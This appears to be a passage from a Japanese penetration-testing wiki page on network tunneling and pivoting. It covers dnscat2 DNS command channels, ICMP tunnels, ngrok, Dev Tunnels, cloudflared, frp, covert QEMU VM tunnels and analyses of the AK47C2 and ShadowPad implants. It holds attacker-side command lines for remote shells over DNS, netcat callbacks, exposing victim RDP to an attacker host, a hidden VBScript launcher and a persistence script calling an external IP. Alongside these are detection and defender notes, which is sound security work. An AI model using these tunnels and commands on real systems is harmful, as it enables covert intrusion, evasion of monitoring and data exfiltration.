[**こちらからダウンロード**](https://github.com/iagox86/dnscat2)**.**

Dnscat2はDNS経由で暗号化されたコマンド＆コントロールチャネルを確立します。以下のサーバーおよびクライアントコマンドは、公式ドキュメントに記載された使用方法に従っています。<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **PowerShell で**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) を使うと、PowerShell で dnscat2 クライアントを実行できます。README には、以下に示す `Start-Dnscat2` のパラメーターが記載されています。<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **dnscat によるポートフォワーディング**

Dnscat2 の対話型 `listen` コマンドは、ローカルのリスナーをリモートホストとポートにマッピングします。<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### proxychains DNS の変更

Proxychains-ng は動的リンクされた TCP 接続をフックしますが、UDP や ICMP は転送できません。DNS プロキシは設定可能なため、固定のパブリック resolver を前提とせず、インストール済みの `proxychains.conf` と resolver helper を確認してください。レガシーな `proxyresolv` スクリプトでは、resolver を選択するために `PROXY_DNS_SERVER` を設定できます。内部名を解決する必要がある場合は、pivot から到達可能な resolver を使用してください。<sup>[[34]](#references)[[35]](#references)</sup>

## Go のトンネル

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### カスタム DNS TXT / HTTP JSON C2（AK47C2）

Storm-2603 actor は、企業ネットワークでブロックされることがほとんどない 2 つのプロトコル、アウトバウンドの **DNS** と **プレーンな HTTP POST** のみを悪用する**デュアルチャネル C2（「AK47C2」）**を作成しました。<sup>[[2]](#references)</sup>

1. **DNS モード（AK47DNS）**
   • ランダムな 5 文字の SessionID（例：`H4T14`）を生成します。  
   • *タスクリクエスト*には `1`、*結果*には `2` を先頭に付け、複数のフィールド（フラグ、SessionID、コンピューター名）を連結します。  
   • 各フィールドは ASCII キー `VHBD@H` で **XOR 暗号化**され、16 進数にエンコードされた後、ドットで連結されます。最後に攻撃者が制御するドメインが付きます。

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • リクエストでは、TXT レコード（フォールバックとして MG レコード）に `DnsQuery()` を使用します。  
   • レスポンスが 0xFF バイトを超えると、バックドアはデータを 63 バイト単位に**分割**し、次のマーカーを挿入します。
     `s<SessionID>t<TOTAL>p<POS>`。これにより C2 サーバーはデータを並べ替えられます。

2. **HTTP mode (AK47HTTP)**
   • JSON エンベロープを作成します。
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • 全体の blob は XOR-`VHBD@H` → hex に変換され、header `Content-Type: text/plain` を付けた **`POST /`** の body として送信されます。
   • 応答も同じ形式でエンコードされ、`cmd` フィールドは `cmd.exe /c <command> 2>&1` で実行されます。

Blue Team notes
• 最初のラベルが長い hexadecimal で、常に同じ珍しい domain で終わる不審な **TXT queries** を探します。
• 定数の XOR key の後に ASCII-hex が続くパターンは、YARA で簡単に検出できます: `6?56484244?484` (`VHBD@H` の hex 表現)。
• HTTP では、body が純粋な hex で、2 バイト単位の長さになっている `text/plain` の POST にフラグを立てます。

{{#note}}
この channel は各 sub-domain label を DNS の 63-octet 制限内に保ちますが、protocol に準拠しているだけでは stealthy とは言えません。珍しい domain、長い hexadecimal label、query の量は引き続き検出のシグナルになります。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans は、TUN device と ICMP echo request を使用する IPv4-over-ICMP tunnel について説明しています。この設定には、interface を作成できるだけの権限が必要です。<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**ここからダウンロード**](https://github.com/utoni/ptunnel-ng.git)。

ptunnel-ng は TCP 接続を ICMP 経由で転送します。以下の `-p`、`-l`、`-r`、`-R` オプションは、それぞれ proxy、ローカルリスナー、宛先ホスト、宛先ポートを指定します。<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) は、セキュアなトンネルを通じてローカルネットワーク上のサービスをオンラインで公開するエージェントです。CLI では HTTP、TCP、file URL のエンドポイントが説明されており、表示されるエンドポイントのホスト名はエンドポイントやアカウントによって異なる場合があります。<sup>[[39]](#references)</sup>

### インストール

- アカウントを作成: https://ngrok.com/signup
- クライアントのダウンロード:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### 基本的な使い方

**ドキュメント:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_必要に応じて、agent は認証と TLS のオプションもサポートします。<sup>[[39]](#references)</sup>_

#### TCP トンネリング

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### HTTPでファイルを公開する

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### HTTP calls のスニッフィング

_XSS、SSRF、SSTI などに便利_\
スタンドアロンエージェントは、デフォルトで `http://127.0.0.1:4040` に HTTP 検査インターフェースを公開します。このインターフェースは HTTP トラフィック用です。<sup>[[40]](#references)</sup>

#### 内部 HTTP サービスのトンネリング

`--host-header=rewrite` オプションは、上流の HTTP `Host` ヘッダーを書き換えて、ローカルサービスに一致させます。<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### ngrok.yaml の簡単な設定例

これは ngrok Agent Config v2 を使用します。名前付きトンネルでは `proto` と `addr` を使い、`ngrok start` で起動します。<sup>[[42]](#references)</sup> 3つのトンネルを開きます。

- TCP 2つ
- /tmp/httpbin/ から静的ファイルを公開する HTTP 1つ

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels は、Microsoft のリレーインフラストラクチャを介して、ローカルの TCP ベースのサービスを公開できます。ホスト側の CLI がアウトバウンドトンネルを作成し、クライアント側で `devtunnel connect` を実行すると、ホストされたポートが再現されます。アクセス制御を意図的に緩和しない限り、トンネルではデフォルトで認証が必要です。<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

これは、境界で新たな受信リスナーを開かずに、`*.devtunnels.ms` 経由で RDP を公開できます。また、`rdp2tcp` などの RDP 仮想チャネル・トンネルと組み合わせることで、RDP セッションを任意の TCP トラフィック向けの第 2 段階の pivot として利用できます。<sup>[[58]](#references)</sup>

ハンティングでは、Dev Tunnels CLI の実行と、`*.devtunnels.ms` への DNS/TLS トラフィック、および予期しない RDP 仮想チャネルイベントを関連付けてください。Microsoft 所有のリレーを使っているからといって、認証済みトンネルが無害とは限りません。<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel の `cloudflared` コネクターはアウトバウンド接続を確立します。公開されたアプリケーションは HTTP、HTTPS、TCP、SSH、RDP をルーティングできますが、Quick Tunnel は HTTP の開発用途を想定しています。<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel のワンライナー

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### SOCKS5 origin（レガシーモード）

レガシーな `--socks5` フラグは、ローカルの origin が SOCKS5 を使用することを `cloudflared` に伝えます。ローカルの SOCKS5 リスナーを作成するものではありません。管理対象トンネルでは、`originRequest.proxyType: socks` によって SOCKS5 origin の処理を設定します。<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### DNSを使用した永続的なトンネル

ローカルで管理するトンネル設定では、以下に示すように、小文字の `tunnel`、`credentials-file`、`url` キーを使用します。<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

コネクターを起動します:

```bash
cloudflared tunnel run mytunnel
```

コネクタはアウトバウンド接続を確立し、デフォルトではQUICをネゴシエートし、失敗した場合はHTTP/2にフォールバックします。すべてのデプロイメントでTCP/443が使われると決めつけないでください。デプロイメントに必要な権限だけを付与して実行してください。<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) は、**TCP、UDP、HTTP/S、STCP/SUDP、TCPMUX、XTCP**をサポートするGo製のリバースプロキシです。XTCPはP2Pのホールパンチングを使用し、その成否はNATに依存します。**v0.53.0**以降は**SSH Tunnel Gateway**として動作できるため、ターゲットホストは`frpc`バイナリなしで標準のOpenSSHクライアントを使用できます。<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### 従来型のリバースTCPトンネル

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### 新しい SSH ゲートウェイを使用する（frpc バイナリなし）

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

上記のコマンドは、`frps` をゲートウェイとして、標準の OpenSSH クライアントを使い、被害者のポート **8080** を **attacker_ip:9000** として公開します。<sup>[[50]](#references)</sup>

## QEMU を使った秘匿 VM ベースのトンネル

QEMU の user-mode networking は、仮想ネットワークに root または管理者権限を必要とせず、`-netdev user,hostfwd=...` によってホストからゲストへの TCP、UDP、または UNIX 接続をリダイレクトします。<sup>[[51]](#references)</sup> TrustedSec は、ホストに重点を置く EDR がゲスト内のアクティビティを見逃す可能性があるインシデントで、Tiny Core QEMU VM と、試みられたリバース SSH トンネルについて記録しています。<sup>[[1]](#references)</sup>

### 簡単なワンライナー

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• 上記のコマンドは、ゲストメモリが256 MiBの**Tiny Core Linux**ゲストを起動します。qcow2ディスクイメージを使用しますが、ディスクイメージはRAMディスクではありません。
• Windowsホストのポート**2222/tcp**は、ゲスト内の**22/tcp**に透過的に転送されます。
• 攻撃者から見ると、ターゲットはポート2222を公開しているだけです。このポートに到達したパケットは、VM内で実行されているSSHサーバーによって処理されます。

### VBScript経由でステルスに起動する

TrustedSecは、上記のインシデントでVBS経由のQEMU起動とTiny Coreイメージを確認しました。<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

`cscript.exe //B update.vbs` でスクリプトを実行すると、ウィンドウは非表示のままになります。<sup>[[1]](#references)</sup>

### ゲスト内のPersistence

引用されているインシデントでは、ステートレスなTiny Coreゲストで `/opt/bootlocal.sh` と `/opt/filetool.lst` を通じてPersistenceを実現しています。<sup>[[1]](#references)</sup>

1. ペイロードを `/opt/123.out` に配置する  
2. `/opt/bootlocal.sh` に追記する:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. シャットダウン時に payload が `mydata.tgz` にパックされるよう、`home/tc` と `opt` を `/opt/filetool.lst` に追加します。

### Telemetry に関する考慮事項

• ホスト上では引き続き、QEMU プロセス、qcow2 イメージ、ホストで転送されたリスナーが確認できます。  
• ホストのみを対象とするプロセススキャンではゲストのプロセスを調査しない場合がありますが、仮想化によって検知を確実に回避できるわけではありません。ネットワーク、QEMU、イメージの telemetry から検出される可能性があります。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 向けのヒント

• ユーザーが書き込み可能なパスにある**予期しない QEMU/VirtualBox/KVM バイナリ**を検知する。  
• `qemu-system*.exe` から発生するアウトバウンド接続をブロックする。  
• QEMU 起動直後にバインドされる、まれなリスニングポート（2222、10022、…）を調査する。

## `HttpAddUrl` による IIS/HTTP.sys リレーノード（ShadowPad）

Check Point は、ShadowPad の IIS モジュールが `HttpAddUrl` で URL プレフィックスをバインドし、侵害された境界 Web サーバーをバックドアおよびリレーノードに変えると説明しています。<sup>[[3]](#references)</sup>

同レポートでは、以下にまとめたデフォルト設定、ワイルドカードリスナー、パケットの復号、リレーキュー、デバッグ telemetry についても詳述しています。<sup>[[3]](#references)</sup>

* **Config のデフォルト値** – モジュールの JSON config で値が省略されている場合、もっともらしい IIS のデフォルト値（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）が使用されます。これにより、通常のトラフィックには IIS が適切なブランド情報を付けて応答します。
* **ワイルドカードによるインターセプト** – オペレーターは、URL プレフィックス（ホストとパスにワイルドカードを使用）をセミコロン区切りで指定します。モジュールは各エントリに対して `HttpAddUrl` を呼び出すため、HTTP.sys は一致するリクエストを悪意のあるハンドラーにルーティングし、一致しないリクエストは通常の IIS の動作にフォールバックします。
* **暗号化された最初のパケット** – リクエストボディの先頭2バイトには、カスタムの32ビット PRNG の seed が格納されます。プロトコルを解析する前に、以降の各バイトは生成された keystream と XOR されます。

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Relay orchestration** – このモジュールは「servers」（上流ノード）と「clients」（下流インプラント）の2つのリストを管理します。約30秒以内にheartbeatを受信しなかったエントリは削除されます。両方のリストが空でない場合、最初に見つかった正常なserverとclientをペアにし、どちらか一方が接続を閉じるまで、それぞれのソケット間でバイト列をそのまま転送します。
* **Debug telemetry** – オプションのログ機能では、ペアごとに送信元IP、宛先IP、転送された合計バイト数を記録します。調査者は、こうした痕跡を使って複数の被害者にまたがるShadowPad meshを再構築しました。

---

## その他に確認するツール

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [QEMU仮想化を利用した隠密トンネル](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell以前：Storm-2603の過去のランサムウェア攻撃を探る](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Ink Dragonの内部：ステルス性の高い攻撃作戦におけるRelay Networkと内部動作を明らかにする](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmapリファレンスガイド：Firewall/IDSの制限を回避する](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD sshマニュアル](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_configマニュアル](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6リリースノート](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit：MetasploitでのPivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxyモジュールのドキュメント](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autorouteモジュールのドキュメント](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike：SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike：Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ngクイックスタート](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socatマニュアル](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plinkマニュアル](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTYコマンドラインオプション](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxyコマンド](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifierドキュメント](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7マニュアル](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035：ドメイン名 - 実装と仕様](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok仮想ホスト](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnelの概要](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnelのoriginパラメーター](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnelのセットアップ](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnelの設定ファイル](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnelの実行パラメーター](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frpの概念](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMUネットワーキングのドキュメント](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [wstunnel README](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [NetSPI BOFScaleソースリポジトリ](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale：BOF-PEからCDN経由のTailnetを構築する](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn - Dev Tunnels CLIコマンド](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [NightEagle APT：GhostContainerとTunneling](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
{{#include ../banners/hacktricks-training.md}}
